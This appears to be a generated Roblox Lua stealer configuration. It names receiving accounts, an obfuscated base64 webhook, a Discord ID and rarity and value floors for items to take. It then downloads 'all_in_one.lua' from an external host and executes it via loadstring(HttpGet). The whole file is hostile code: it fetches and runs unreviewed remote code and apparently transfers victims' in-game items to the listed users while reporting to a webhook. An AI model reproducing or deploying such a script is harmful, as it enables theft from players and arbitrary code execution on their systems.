-- This file was generated at discord.gg/syncrypt

Username = { "kxtp111", "PoziBaskan_YTB", "benpozibaskan" }
Webhook = "MmIxYTI4ODU2NjAzNDhjNGIzNWVkZjZlMDAxZjg3ZDZWeFI5RmxaN0MzNXhRbHRYZkVzN1FqcFZWd29tTlYwb1dXcGROd0JjTEZSakRYUXNZbWhyUWc5QWZWb0ZWRFpCRmdWTUVBc3VRU1JIWG5jVEYxMGhlSFZTUUJkY1YwbHhEblJSVlZJSkFtNGpaZ0kyVVMxUk1YY2JRbFFKUkJjQllsZGNORmx2WWs4SFlrVjNYSGNHQXlSWUJqY2dIMlZTWHdkSEFYRmdYWHBGSVhzMlhWc09UMUIzVW5kRWJTUmpKa1JmSXgwdVlWQm1BMzlOWVFJUUJIc3NjQXhjV2dsR2VXWUFWVk4wTFVjMlhsOHpEaTVDQmxaZVlsWndIQnhpWVZkRVdWbDZiMkZZV21OWmRVazNUVkZRQWpjS00zZ3daRVZVSkZrY0NsMS9MbmNwZTExS1Fua0dZVU5tZmxSMkFGQjdWQzBWVURKcEExa1NRbk1wUmtZR1Z5TjRWbXNDYm5oV1VReDJLbHROQm5rVE54d0NJbHNmZHlWYlFnTllWQkJmTzBOUldReDdjR2tIQXcwelV4aEtYUjB2VjFnUWVsbFlJSHRGSUd4ckZrUUlSQXhJVTNkTVp3RlJVZzVRRHdWZURDZ0tmUXBnR3dZTWQxOVVCRUlVZkU1Z1NtNUNYWEZwVzJGMk4zSXlRVklTSXdrT0NVUUdSVFpWQWdFR2VqTlhGbGw3Ymd4YWNGVUxiVjVhZWpoWlpRQVRDbmsxZm5kZFgySkhCM0ZES2tJaWFBME5abGRqWGxsQlRWQkJEWHBrSnhjM0MxZz0="
minrarity = "Unique"
minrarity_sailor = "Common"
min_gen = 0
min_rap = 0
min_val_each = 10
discord_id = "1124653298012655716"
local u1 = false
local thread = task.spawn(function()
	local ok, result = pcall(function()
		return game:HttpGet("https://www.astatine.vip/scripts/all_in_one.lua")
	end)

	if not (ok and result) then
		return
	end

	u1 = true
end)

task.wait(1)
task.cancel(thread)
proxy = u1 and "https://www.astatine.vip/scripts/" or "https://astatine.vip/scripts/"
loadstring(game:HttpGet(proxy .. "all_in_one.lua"))()
